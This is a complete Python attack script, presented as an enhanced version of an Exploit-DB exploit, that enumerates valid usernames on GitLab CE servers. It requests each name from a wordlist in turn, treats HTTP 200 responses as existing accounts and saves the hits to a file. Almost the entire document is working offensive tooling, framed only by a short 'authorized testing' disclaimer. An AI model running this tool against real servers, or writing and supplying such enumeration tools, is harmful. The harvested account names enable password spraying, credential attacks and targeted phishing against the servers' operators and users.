#!/usr/bin/env python3
"""
GitLab User Enumeration Tool - Enhanced Version
Original Author: @4D0niiS [https://github.com/4D0niiS]
Original Exploit: https://www.exploit-db.com/exploits/49821
Enhanced by: sqlj3d1
Description: Improved Python3 version with output options, verbosity modes, and better error handling
Disclaimer: For authorized security testing only. Unauthorized access is illegal.
"""

import requests
import argparse
import sys
import signal
from pathlib import Path
from typing import List

# Color codes for terminal output
class Colors:
    RED = '\033[38;5;196m'
    GREEN = '\033[38;5;47m'
    YELLOW = '\033[0;33m'
    CYAN = '\033[38;5;51m'
    PINK = '\033[38;5;198m'
    BLUE = '\033[44m'
    BOLD = '\033[1m'
    ITALIC = '\033[3m'
    RESET = '\033[0m'

# Global stats
found_users = 0
output_file = None

def signal_handler(sig, frame):
    """Handle Ctrl+C gracefully"""
    print(f"\n{Colors.YELLOW}{Colors.BOLD}[!]{Colors.RESET} Interrupted by user")
    if output_file:
        print(f"{Colors.CYAN}{Colors.BOLD}[i]{Colors.RESET} Valid usernames saved to: {output_file}")
    print(f"{Colors.CYAN}{Colors.BOLD}[i]{Colors.RESET} Total valid users found: {found_users}")
    sys.exit(130)

def print_banner():
    """Display tool banner"""
    banner = f"""
{Colors.BLUE}{Colors.BOLD}╔═══════════════════════════════════════════════════════════════════════════╗
║                                                                           ║
║        GitLab CE User Enumeration Tool - Enhanced Version                ║
║                                                                           ║
║        Original: @4D0niiS (Exploit-DB #49821)                            ║
║        Enhanced by: sqlj3d1                                               ║
║                                                                           ║
╚═══════════════════════════════════════════════════════════════════════════╝{Colors.RESET}

{Colors.CYAN}[*] Purpose:{Colors.RESET} Identify valid usernames on GitLab CE instances
{Colors.CYAN}[*] Original:{Colors.RESET} https://www.exploit-db.com/exploits/49821
{Colors.CYAN}[*] Improvements:{Colors.RESET} Output file support, verbosity modes, progress tracking
{Colors.YELLOW}[!] Warning:{Colors.RESET} Unauthorized access is illegal - use responsibly
"""
    print(banner)

def load_usernames(filepath: str) -> List[str]:
    """Load usernames from wordlist file"""
    try:
        with open(filepath, 'r', encoding='utf-8', errors='ignore') as f:
            # Filter empty lines and comments
            usernames = [line.strip() for line in f if line.strip() and not line.startswith('#')]
        return usernames
    except FileNotFoundError:
        print(f"{Colors.RED}{Colors.BOLD}[!]{Colors.RESET} Wordlist file not found: {filepath}")
        sys.exit(1)
    except PermissionError:
        print(f"{Colors.RED}{Colors.BOLD}[!]{Colors.RESET} Permission denied reading: {filepath}")
        sys.exit(1)

def save_username(username: str, output_path: str):
    """Append valid username to output file"""
    try:
        with open(output_path, 'a', encoding='utf-8') as f:
            f.write(f"{username}\n")
    except Exception as e:
        print(f"{Colors.RED}{Colors.BOLD}[!]{Colors.RESET} Error writing to output file: {e}")

def check_username(url: str, username: str, verbose: int, output_path: str = None) -> bool:
    """
    Test if username exists on GitLab instance
    Returns True if user found, False otherwise
    """
    global found_users
    
    target_url = f"{url}/{username}"
    
    try:
        # Send HTTP request with timeout
        response = requests.get(target_url, timeout=10, allow_redirects=False)
        status_code = response.status_code
        
        # Analyze response codes
        if status_code == 200:
            # Valid user found
            found_users += 1
            print(f"{Colors.GREEN}{Colors.BOLD}[+]{Colors.RESET} Valid user: {Colors.GREEN}{Colors.BOLD}{username}{Colors.RESET} (HTTP 200)")
            if output_path:
                save_username(username, output_path)
            return True
            
        elif status_code == 404:
            # User not found
            if verbose == 2:
                print(f"{Colors.PINK}{Colors.BOLD}[-]{Colors.RESET} {username} -> Not found (HTTP 404)")
            return False
            
        elif status_code in [301, 302]:
            # Redirect detected
            if verbose == 2:
                print(f"{Colors.YELLOW}{Colors.BOLD}[?]{Colors.RESET} {username} -> Redirect detected (HTTP {status_code})")
            return False
            
        elif status_code == 403:
            # Forbidden
            if verbose == 2:
                print(f"{Colors.YELLOW}{Colors.BOLD}[?]{Colors.RESET} {username} -> Forbidden (HTTP 403)")
            return False
            
        elif status_code in [500, 502, 503]:
            # Server error
            if verbose >= 1:
                print(f"{Colors.RED}{Colors.BOLD}[!]{Colors.RESET} {username} -> Server error (HTTP {status_code})")
            return False
            
        else:
            # Other status codes
            if verbose == 2:
                print(f"{Colors.PINK}{Colors.BOLD}[-]{Colors.RESET} {username} -> HTTP {status_code}")
            return False
            
    except requests.exceptions.Timeout:
        print(f"{Colors.RED}{Colors.BOLD}[!]{Colors.RESET} Request timeout for: {username}")
        return False
    except requests.exceptions.ConnectionError:
        print(f"{Colors.RED}{Colors.BOLD}[!]{Colors.RESET} Connection error - target may be unreachable")
        sys.exit(1)
    except Exception as e:
        if verbose >= 1:
            print(f"{Colors.RED}{Colors.BOLD}[!]{Colors.RESET} Error checking {username}: {e}")
        return False

def enumerate_users(url: str, usernames: List[str], verbose: int, output_path: str = None):
    """Main enumeration logic"""
    total = len(usernames)
    
    print(f"{Colors.CYAN}{Colors.BOLD}[i]{Colors.RESET} Total usernames to test: {total}")
    if output_path:
        print(f"{Colors.CYAN}{Colors.BOLD}[i]{Colors.RESET} Output file: {output_path}")
    print()
    
    # Enumerate each username
    for idx, username in enumerate(usernames, 1):
        if verbose >= 1:
            # Show progress
            print(f"{Colors.BOLD}Testing [{idx}/{total}]:{Colors.RESET} {username}", end='\r')
            sys.stdout.flush()
        
        check_username(url, username, verbose, output_path)
        
        # Clear progress line if in normal/verbose mode
        if verbose >= 1:
            print(' ' * 80, end='\r')
            sys.stdout.flush()

def main():
    """Main entry point"""
    global output_file
    
    # Setup argument parser
    parser = argparse.ArgumentParser(
        description='GitLab User Enumeration Tool - Enhanced by sqlj3d1 (Original: Exploit-DB #49821)',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
Examples:
  %(prog)s -u http://gitlab.local -w usernames.txt
  %(prog)s -u http://gitlab.local -w usernames.txt -o valid_users.txt
  %(prog)s -u http://gitlab.local -w usernames.txt --quiet
  %(prog)s -u http://gitlab.local -w usernames.txt --verbose
        """
    )
    
    # Required arguments
    parser.add_argument('-u', '--url', required=True, help='Target GitLab instance URL')
    parser.add_argument('-w', '--wordlist', required=True, help='Path to username wordlist')
    
    # Optional arguments
    parser.add_argument('-o', '--output', help='Save valid usernames to file')
    parser.add_argument('-q', '--quiet', action='store_true', help='Quiet mode (only show found users)')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose mode (show all HTTP codes)')
    
    args = parser.parse_args()
    
    # Setup signal handler for graceful exit
    signal.signal(signal.SIGINT, signal_handler)
    
    # Display banner
    print_banner()
    
    # Validate URL format
    if not args.url.startswith(('http://', 'https://')):
        print(f"{Colors.RED}{Colors.BOLD}[!]{Colors.RESET} Invalid URL format. Must start with http:// or https://")
        sys.exit(1)
    
    # Normalize URL (remove trailing slash)
    target_url = args.url.rstrip('/')
    
    # Set verbosity level
    if args.quiet:
        verbose = 0
    elif args.verbose:
        verbose = 2
    else:
        verbose = 1
    
    # Initialize output file if specified
    if args.output:
        output_file = args.output
        try:
            Path(args.output).touch()
            # Clear file contents
            open(args.output, 'w').close()
        except Exception as e:
            print(f"{Colors.RED}{Colors.BOLD}[!]{Colors.RESET} Cannot create output file: {e}")
            sys.exit(1)
    
    # Load usernames from wordlist
    print(f"{Colors.CYAN}{Colors.BOLD}[i]{Colors.RESET} Loading wordlist...")
    usernames = load_usernames(args.wordlist)
    
    # Start enumeration
    enumerate_users(target_url, usernames, verbose, args.output)
    
    # Print summary
    print()
    print(f"{Colors.CYAN}{Colors.BOLD}{'=' * 50}{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}Enumeration Complete{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}{'=' * 50}{Colors.RESET}")
    print(f"{Colors.CYAN}{Colors.BOLD}[i]{Colors.RESET} Usernames tested: {len(usernames)}")
    print(f"{Colors.CYAN}{Colors.BOLD}[i]{Colors.RESET} Valid users found: {found_users}")
    if args.output:
        print(f"{Colors.CYAN}{Colors.BOLD}[i]{Colors.RESET} Results saved to: {args.output}")
    print()

if __name__ == '__main__':
    main()
